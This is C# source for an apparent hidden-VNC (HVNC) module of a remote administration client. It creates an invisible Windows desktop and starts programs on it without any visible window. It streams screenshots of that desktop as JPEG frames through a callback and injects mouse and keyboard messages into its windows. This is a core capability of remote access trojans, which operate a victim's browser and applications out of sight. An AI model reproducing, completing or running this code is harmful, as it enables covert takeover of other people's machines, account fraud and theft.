using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Modules
{
    /// <summary>
    /// HVNC Handler that extracts raw pixel data without relying on GDI+ FromHbitmap
    /// This works on hidden desktops where GDI+ operations fail
    /// </summary>
    public class HvncHandler
    {
        private bool _isRunning = false;
        private string _desktopName = "hidden_desktop";
        private IntPtr _hDesktop = IntPtr.Zero;
        private IntPtr _originalDesktop = IntPtr.Zero;
        private Thread _captureThread;
        private int _quality = 80;
        private Action<byte[], int, int> _sendFrameCallback;
        private int _screenWidth = 1920;
        private int _screenHeight = 1080;

        #region Win32 API Declarations

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public uint[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadDesktop(int dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern int GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
            IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines,
            [Out] byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            int dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWindowsProc lpfn, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;
        private const int SRCCOPY = 0x00CC0020;
        private const int DIB_RGB_COLORS = 0;
        private const int BI_RGB = 0;

        #endregion

        public HvncHandler(Action<byte[], int, int> sendFrameCallback)
        {
            _sendFrameCallback = sendFrameCallback;
        }

        public async Task StartAsync(string desktopName, int quality)
        {
            if (_isRunning) return;

            try
            {
                _desktopName = desktopName;
                _quality = quality;

                _originalDesktop = GetThreadDesktop(GetCurrentThreadId());
                _screenWidth = GetSystemMetrics(SM_CXSCREEN);
                _screenHeight = GetSystemMetrics(SM_CYSCREEN);

                Console.WriteLine($"📐 Main desktop dimensions: {_screenWidth}x{_screenHeight}");

                if (_screenWidth <= 0 || _screenHeight <= 0)
                {
                    _screenWidth = 1920;
                    _screenHeight = 1080;
                    Console.WriteLine($"⚠️ Using fallback dimensions: {_screenWidth}x{_screenHeight}");
                }

                _hDesktop = OpenDesktop(_desktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);

                if (_hDesktop == IntPtr.Zero)
                {
                    _hDesktop = CreateDesktop(
                        _desktopName,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        0,
                        (uint)DESKTOP_ACCESS.GENERIC_ALL,
                        IntPtr.Zero);
                }

                if (_hDesktop == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"Failed to create/open desktop. Error code: {error}");
                }

                _isRunning = true;

                _captureThread = new Thread(CaptureLoop)
                {
                    IsBackground = true,
                    Name = "HVNC Capture Thread"
                };
                _captureThread.Start();

                Console.WriteLine($"✅ HVNC started on desktop: {_desktopName} (Handle: {_hDesktop})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Failed to start HVNC: {ex.Message}");
                if (_hDesktop != IntPtr.Zero)
                {
                    CloseDesktop(_hDesktop);
                    _hDesktop = IntPtr.Zero;
                }
                throw;
            }
        }

        public void Stop()
        {
            _isRunning = false;

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _captureThread.Join(2000);
            }

            if (_hDesktop != IntPtr.Zero)
            {
                CloseDesktop(_hDesktop);
                _hDesktop = IntPtr.Zero;
            }

            GC.Collect();
            Console.WriteLine("HVNC stopped");
        }

        public void SetQuality(int quality)
        {
            _quality = Math.Max(10, Math.Min(100, quality));
        }

        public async Task SendInputAsync(int messageType, int wParam, int lParam)
        {
            if (!_isRunning || _hDesktop == IntPtr.Zero) return;

            try
            {
                IntPtr currentDesktop = GetThreadDesktop(GetCurrentThreadId());
                SetThreadDesktop(_hDesktop);

                int x = lParam & 0xFFFF;
                int y = (lParam >> 16) & 0xFFFF;
                POINT point = new POINT { x = x, y = y };

                IntPtr hWnd = WindowFromPoint(point);

                if (hWnd != IntPtr.Zero)
                {
                    PostMessage(hWnd, (uint)messageType, (IntPtr)wParam, (IntPtr)lParam);
                }

                SetThreadDesktop(currentDesktop);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send input: {ex.Message}");
            }
        }

        public async Task StartProcessAsync(string processPath, string arguments)
        {
            if (!_isRunning || _hDesktop == IntPtr.Zero) return;

            try
            {
                Console.WriteLine($"🚀 Starting process: {processPath}");
                Console.WriteLine($"   Desktop: {_desktopName}");
                Console.WriteLine($"   Desktop Handle: {_hDesktop}");

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = _desktopName;
                si.dwFlags = 0;
                si.wShowWindow = 0;

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string commandLine = string.IsNullOrEmpty(arguments)
                    ? processPath
                    : $"\"{processPath}\" {arguments}";

                Console.WriteLine($"   Command: {commandLine}");

                bool success = CreateProcess(
                    null,
                    commandLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0,
                    IntPtr.Zero,
                    null,
                    ref si,
                    ref pi);

                if (success)
                {
                    Console.WriteLine($"✅ Process started successfully!");
                    Console.WriteLine($"   Process ID: {pi.dwProcessId}");
                    Console.WriteLine($"   Thread ID: {pi.dwThreadId}");
                    Console.WriteLine($"   Process Handle: {pi.hProcess}");

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);

                    // Give the process time to create windows
                    await Task.Delay(2000);
                    Console.WriteLine("   Waiting 2 seconds for windows to appear...");
                }
                else
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"❌ CreateProcess failed. Error: {error}");
                    throw new Exception($"CreateProcess failed. Error: {error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Failed to start process: {ex.Message}");
                throw;
            }
        }

        private void CaptureLoop()
        {
            Console.WriteLine("🎥 HVNC capture loop started");

            try
            {
                if (!SetThreadDesktop(_hDesktop))
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"❌ Failed to set thread desktop. Error: {error}");
                    return;
                }

                Console.WriteLine($"✅ Capture thread switched to hidden desktop");

                int frameCount = 0;
                while (_isRunning)
                {
                    try
                    {
                        // Every 10 frames, list windows to verify they exist
                        if (frameCount % 10 == 0)
                        {
                            ListDesktopWindows();
                        }

                        byte[] frameData = CaptureDesktopUsingGetDIBits();

                        if (frameData != null && frameData.Length > 0)
                        {
                            _sendFrameCallback?.Invoke(frameData, _screenWidth, _screenHeight);
                        }

                        int delay = _quality >= 70 ? 50 : _quality >= 40 ? 100 : 150;
                        Thread.Sleep(delay);
                        frameCount++;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Capture error: {ex.Message}");
                        Thread.Sleep(1000);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Capture loop fatal error: {ex.Message}");
            }
            finally
            {
                if (_originalDesktop != IntPtr.Zero)
                {
                    SetThreadDesktop(_originalDesktop);
                }
            }

            Console.WriteLine("🎥 HVNC capture loop stopped");
        }

        private void ListDesktopWindows()
        {
            try
            {
                Console.WriteLine("🪟 Enumerating windows on hidden desktop...");
                int windowCount = 0;

                EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
                {
                    if (IsWindowVisible(hWnd))
                    {
                        int length = GetWindowTextLength(hWnd);
                        System.Text.StringBuilder sb = new System.Text.StringBuilder(length + 1);
                        GetWindowText(hWnd, sb, sb.Capacity);

                        string title = sb.ToString();
                        if (!string.IsNullOrEmpty(title))
                        {
                            Console.WriteLine($"   Window: {title} (Handle: {hWnd})");
                            windowCount++;
                        }
                    }
                    return true; // Continue enumeration
                }, IntPtr.Zero);

                if (windowCount == 0)
                {
                    Console.WriteLine("   ⚠️ No visible windows found on hidden desktop!");
                }
                else
                {
                    Console.WriteLine($"   Found {windowCount} visible windows");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to enumerate windows: {ex.Message}");
            }
        }

        /// <summary>
        /// Captures desktop using GetDIBits to extract raw pixel data
        /// This avoids GDI+ Image.FromHbitmap which fails on hidden desktops
        /// </summary>
        private byte[] CaptureDesktopUsingGetDIBits()
        {
            IntPtr hdcScreen = IntPtr.Zero;
            IntPtr hdcMemDC = IntPtr.Zero;
            IntPtr hBitmap = IntPtr.Zero;
            IntPtr hOldBitmap = IntPtr.Zero;

            try
            {
                // Get desktop DC
                hdcScreen = GetDC(IntPtr.Zero);
                if (hdcScreen == IntPtr.Zero)
                {
                    Console.WriteLine("❌ GetDC failed");
                    return null;
                }

                // Create compatible DC
                hdcMemDC = CreateCompatibleDC(hdcScreen);
                if (hdcMemDC == IntPtr.Zero)
                {
                    Console.WriteLine("❌ CreateCompatibleDC failed");
                    return null;
                }

                // Create compatible bitmap
                hBitmap = CreateCompatibleBitmap(hdcScreen, _screenWidth, _screenHeight);
                if (hBitmap == IntPtr.Zero)
                {
                    Console.WriteLine("❌ CreateCompatibleBitmap failed");
                    return null;
                }

                // Select bitmap into DC
                hOldBitmap = SelectObject(hdcMemDC, hBitmap);

                // Copy screen to bitmap using BitBlt
                bool bitBltResult = BitBlt(hdcMemDC, 0, 0, _screenWidth, _screenHeight,
                                          hdcScreen, 0, 0, SRCCOPY);

                if (!bitBltResult)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"❌ BitBlt failed. Error: {error}");
                    return null;
                }

                Console.WriteLine("✅ BitBlt successful");

                // NOW: Extract raw pixel data using GetDIBits instead of Image.FromHbitmap
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
                bmi.bmiHeader.biWidth = _screenWidth;
                bmi.bmiHeader.biHeight = -_screenHeight; // Negative for top-down DIB
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 24; // 24-bit RGB
                bmi.bmiHeader.biCompression = BI_RGB;
                bmi.bmiHeader.biSizeImage = 0;

                // Calculate size of pixel data
                int stride = ((_screenWidth * 3 + 3) / 4) * 4; // Must be multiple of 4
                int bufferSize = stride * _screenHeight;
                byte[] pixelData = new byte[bufferSize];

                // Extract pixel data
                int result = GetDIBits(hdcScreen, hBitmap, 0, (uint)_screenHeight,
                                      pixelData, ref bmi, DIB_RGB_COLORS);

                if (result == 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"❌ GetDIBits failed. Error: {error}");
                    return null;
                }

                Console.WriteLine($"✅ GetDIBits successful, extracted {pixelData.Length} bytes");

                // ANALYZE THE PIXEL DATA
                bool allBlack = true;
                bool allWhite = true;
                int nonZeroPixels = 0;

                for (int i = 0; i < Math.Min(pixelData.Length, 10000); i += 3)
                {
                    byte b = pixelData[i];
                    byte g = pixelData[i + 1];
                    byte r = pixelData[i + 2];

                    if (b != 0 || g != 0 || r != 0)
                    {
                        allBlack = false;
                        nonZeroPixels++;
                    }
                    if (b != 255 || g != 255 || r != 255)
                    {
                        allWhite = false;
                    }
                }

                Console.WriteLine($"📊 Pixel Analysis:");
                Console.WriteLine($"   Total bytes: {pixelData.Length}");
                Console.WriteLine($"   Non-zero pixels (sample): {nonZeroPixels}");
                Console.WriteLine($"   All black: {allBlack}");
                Console.WriteLine($"   All white: {allWhite}");

                if (allBlack)
                {
                    Console.WriteLine("⚠️ WARNING: Captured image is completely black!");
                    Console.WriteLine("   This means the hidden desktop has no content");
                    Console.WriteLine("   Have you launched Explorer or any other application?");
                }

                // Convert raw pixel data to Bitmap without using FromHbitmap
                Bitmap bitmap = new Bitmap(_screenWidth, _screenHeight, PixelFormat.Format24bppRgb);
                BitmapData bmpData = bitmap.LockBits(
                    new Rectangle(0, 0, _screenWidth, _screenHeight),
                    ImageLockMode.WriteOnly,
                    PixelFormat.Format24bppRgb);

                Marshal.Copy(pixelData, 0, bmpData.Scan0, pixelData.Length);
                bitmap.UnlockBits(bmpData);

                Console.WriteLine("✅ Bitmap created from raw pixels");

                // Compress to JPEG
                byte[] compressedData = CompressImage(bitmap);
                bitmap.Dispose();

                Console.WriteLine($"✅ Frame compressed: {compressedData?.Length ?? 0} bytes");
                return compressedData;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Capture exception: {ex.Message}");
                Console.WriteLine($"Stack: {ex.StackTrace}");
                return null;
            }
            finally
            {
                if (hOldBitmap != IntPtr.Zero)
                    SelectObject(hdcMemDC, hOldBitmap);
                if (hBitmap != IntPtr.Zero)
                    DeleteObject(hBitmap);
                if (hdcMemDC != IntPtr.Zero)
                    DeleteDC(hdcMemDC);
                if (hdcScreen != IntPtr.Zero)
                    ReleaseDC(IntPtr.Zero, hdcScreen);
            }
        }

        private byte[] CompressImage(Bitmap image)
        {
            try
            {
                using (var ms = new MemoryStream())
                {
                    var encoderParameters = new EncoderParameters(1);
                    encoderParameters.Param[0] = new EncoderParameter(
                        System.Drawing.Imaging.Encoder.Quality, (long)_quality);

                    var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                    if (jpegCodec != null)
                    {
                        image.Save(ms, jpegCodec, encoderParameters);
                    }
                    else
                    {
                        image.Save(ms, ImageFormat.Jpeg);
                    }

                    return ms.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Compression error: {ex.Message}");
                return null;
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}